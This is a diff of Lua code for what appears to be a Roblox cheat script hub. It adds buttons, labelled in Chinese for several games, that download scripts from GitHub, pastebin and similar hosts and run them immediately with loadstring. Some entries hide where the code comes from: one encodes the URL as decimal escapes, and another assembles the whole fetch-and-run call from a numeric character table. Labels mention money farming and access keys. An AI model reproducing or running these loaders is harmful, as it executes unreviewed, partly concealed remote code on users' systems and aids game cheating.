+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ScripterVaz/InkGameAzure/main/Protected_7974105512464815.lua.txt"))()
+    end)
+end)
+
+Button(Tab30, "汉化脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/XOTRXONY/INKGAME/main/INKGAMEE.lua", true))()
+    end)
+end)
+
+Button(Tab30, "XA脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/hngamingroblox/scripts/main/strongman%20simulator'))()
+    end)
+end)
+
+-- 自然灾害模拟器 (Tab31)
+Button(Tab31, "脚本1", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringUjHI6RQpz2o8", true))()
+    end)
+end)
+
+Button(Tab31, "万磁王", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/CMnEfnz8"))()
+    end)
+end)
+
+Button(Tab31, "黑洞v6", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Super-ring-Parts-V6-28581"))()
+    end)
+end)
+
+-- 穷小子打工记 (Tab32)
+Button(Tab32, "神青脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/gycgchgyfytdttr/QQ-9-2-8-9-50173/refs/heads/main/newsqnb.lua"))()
+    end)
+end)
+
+-- 最后的黎明 (Tab33)
+Button(Tab33, "脚本1", function()
+    pcall(function()
+    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\97\112\112\47\108\121\98\121\80\50\103\54\47\114\97\119"))()
+    end)
+end)
+
+-- 索纳里亚世界 (Tab34)
+Button(Tab34, "索纳里亚世界1", function()
+    pcall(function()
+    end)
+end)
+
+Button(Tab34, "索纳里亚世界2", function()
+    pcall(function()
+    _G.Enabled = true
+-- If you want to turn it off, just change true to false and execute again!
+loadstring(game:HttpGet("https://pastebin.com/raw/CPPehxn8", true))()
+    end)
+end)
+
+Button(Tab34, "索纳里亚世界3", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Mangnex/Lunar-Hub/refs/heads/main/FreeLoader.lua"))()
+    end)
+end)
+
+Button(Tab34, "索纳里亚世界4", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Looser3itx/Hmmmmmmmmmmmmmmmmmmmmmmmmmmmm/main/loader.lua"))()
+    end)
+end)
+
+-- 河北唐县 (Tab35)
+Button(Tab35, "皮脚本-河北唐县", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/Pi-script-Hebeitangxian.lua"))()
+    end)
+end)
+
+Button(Tab35, "卡车刷钱", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaoyi-boop/-/refs/heads/main/YItangxian.lua",true))()
+    end)
+end)
+
+Button(Tab35, "脚本1", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Sw1ndlerScripts/RobloxScripts/main/Tang%20Country.lua"))()
+    end)
+end)
+
+Button(Tab35, "脚本2", function()
+    pcall(function()
+    getgenv().Leng="冷脚本QQ群815883059" loadstring(game:HttpGet("https://raw.githubusercontent.com/odhdshhe/Tang-County-Hebei-Province/refs/heads/main/LENG%20Tang%20County%2C%20Hebei%20Province.txt"))()
+    end)
+end)
+
+-- 被遗弃 (Tab36)
+Button(Tab36, "脚本1", function()
+    pcall(function()
+    loadstring(utf8.char((function() return table.unpack({108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,67,104,105,110,97,81,89,47,45,47,109,97,105,110,47,37,69,54,37,56,51,37,56,53,37,69,52,37,66,65,37,57,49,34,41,41,40,41})end)()))()
+    end)
+end)
+
+Button(Tab36, "脚本2", function()
+    pcall(function()
+    loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/ivannetta/ShitScripts/refs/heads/main/forsaken.lua")))()
+    end)
+end)
+
+Button(Tab36, "汉化脚本（卡密：Samuelspizzatrip", function()
+    pcall(function()
+    getgenv().XiaoPi="被遗弃-B0bby[汉化版]" loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/187ec501507e956200e0741a7bc38ca1cd83973f/%E8%A2%AB%E9%81%97%E5%BC%83B0bby%E6%B1%89%E5%8C%96%20(1).lua"))()
+    end)
+end)
+
+Button(Tab36, "脚本3（卡密:BOBBYHUBKEYWJJEBEKEI1827272）", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/BobJunior1/ForsakenBoi/refs/heads/main/B0bbyHub"))()
+    end)
+end)
+
